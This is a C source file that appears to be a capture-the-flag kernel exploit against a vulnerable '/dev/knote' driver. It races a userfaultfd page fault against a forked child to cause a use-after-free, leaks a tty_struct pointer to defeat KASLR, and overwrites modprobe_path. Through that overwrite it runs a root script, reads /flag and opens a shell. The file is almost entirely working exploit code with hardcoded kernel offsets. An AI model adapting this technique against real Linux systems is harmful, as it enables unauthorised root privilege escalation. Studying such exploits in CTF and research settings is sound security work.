//
// Created by ubuntu on 22-10-5.
//
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include "kernel.h"

typedef struct input{
    union{
        size_t size;
        size_t index;
    }info;
    char* buf;
}input;

#define GET 0x2333
#define ADD 0x1337
#define EDIT 0x8888
#define DEL 0x6666
#define TTY_STRUCT_SIZE 0x2E0

#define DO_SAK_WORK_ADDR 0xFFFFFFFF815D4EF0
#define COMMIT_CREDS 0xFFFFFFFF810B3040
#define PREPARE_KERNEL_CRED 0xFFFFFFFF810B3390
#define MODPROBE_PATH 0xFFFFFFFF8245C5C0

int fd;
static char* faultBuffer;

void get(int index, char* buffer){
    input in = {
            .info.index = index,
            .buf = buffer,
    };
    ioctl(fd, GET, &in);
}

void add(int size){
    input in = {
            .info.size = size,
    };
    ioctl(fd, ADD, &in);
}

void dele(int index){
    input in = {
            .info.index = index,
    };
    ioctl(fd, DEL, &in);
}

void edit(int index, char* buffer){
    input in = {
            .info.index = index,
            .buf = buffer,
    };
    ioctl(fd, EDIT, &in);
}

static char *page = NULL;
static long page_size;

static void *
fault_handler_thread(void *arg)
{
    struct uffd_msg msg;
    int fault_cnt = 0;
    long uffd;

    struct uffdio_copy uffdio_copy;
    ssize_t nread;

    uffd = (long) arg;

    for (;;)
    {
        struct pollfd pollfd;
        int nready;
        pollfd.fd = uffd;
        pollfd.events = POLLIN;
        nready = poll(&pollfd, 1, -1);

        if (nready == -1)
            errExit("poll");

        nread = read(uffd, &msg, sizeof(msg));

        puts(GREEN "Parent process stopped here." CEND);
        sleep(5);

        if (nread == 0)
            errExit("EOF on userfaultfd!\n");

        if (nread == -1)
            errExit("read");

        if (msg.event != UFFD_EVENT_PAGEFAULT)
            errExit("Unexpected event on userfaultfd\n");

        uffdio_copy.src = (unsigned long) page;
        uffdio_copy.dst = (unsigned long) msg.arg.pagefault.address &
                          ~(page_size - 1);
        uffdio_copy.len = page_size;
        uffdio_copy.mode = 0;
        uffdio_copy.copy = 0;
        if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
            errExit("ioctl-UFFDIO_COPY");

        return NULL;
    }
}

int main(){

    saveStatus();
    page_size = sysconf(_SC_PAGE_SIZE);
    page = malloc(0x1000);
    memset(page, '0', 0x1000);
    faultBuffer = (char*)mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    registerUserFaultFd(faultBuffer, 0x1000, (void*)fault_handler_thread);

    int shellFile = open("/getFlag", O_RDWR | O_CREAT);
    char* shellCode = "#!/bin/sh\n"
                      "chmod 777 /flag";
    write(shellFile, shellCode, strlen(shellCode));
    close(shellFile);
    system("chmod +x /getFlag");

    fd = open("/dev/knote", O_RDWR);
    add(TTY_STRUCT_SIZE);
    int pid = fork();
    if(pid < 0)
        errExit("Fork failed");
    else if(pid == 0){
        puts(GREEN "Child process sleeping..." CEND);
        sleep(2);
        puts(GREEN "Ready to delete note in child process..." CEND);
        dele(0);
        sleep(1);
        puts(GREEN "Ready to open /dev/ptmx in child process..." CEND);
        open("/dev/ptmx", O_RDWR);
        exit(0);
    }else
        get(0, faultBuffer);

    print_binary(faultBuffer, TTY_STRUCT_SIZE);
    u_int64_t do_sak_work = *((u_int64_t*)(faultBuffer + 0x2B0));
    if(!do_sak_work)
        errExit("Failed to get do_SAK_work!");
    printf(GREEN "Successfully got address of do_SAK_work: %#zx" CEND, do_sak_work);
    u_int64_t offset = do_sak_work - DO_SAK_WORK_ADDR;  // offset got

    commit_creds = offset + COMMIT_CREDS;               // get address of commit_creds
    prepare_kernel_cred = offset + PREPARE_KERNEL_CRED; // get address of prepare_kernel_cred
    u_int64_t modprobe_path = offset + MODPROBE_PATH;   // get address of modprobe_path

    add(0x100);
    memcpy(page, &modprobe_path, 8);
    pid = fork();
    if(pid < 0)
        errExit("Fork failed");
    else if(pid == 0){
        puts(GREEN "Child process sleeping..." CEND);
        sleep(2);
        puts(GREEN "Ready to delete note in child process..." CEND);
        dele(0);
        sleep(1);
        puts(GREEN "Ready to open /dev/ptmx in child process..." CEND);
        open("/dev/ptmx", O_RDWR);
        exit(0);
    }else
        edit(0, page);

    add(0x100);
    add(0x100);     // this cache allocates to modprobe_path
    edit(1, "/getFlag");

    system("echo -e '\xff\xff\xff\xff' > /hook");
    system("chmod +x /hook");
    system("/hook");

    sleep(1);
    int flag = open("/flag", O_RDWR);
    if(flag < 0)
        errExit("Failed to open flag file!");
    char flagContent[0x50] = {0};
    read(flag, flagContent, 0x50);
    write(1, flagContent, 0x50);
    system("/bin/sh");

    return 0;
}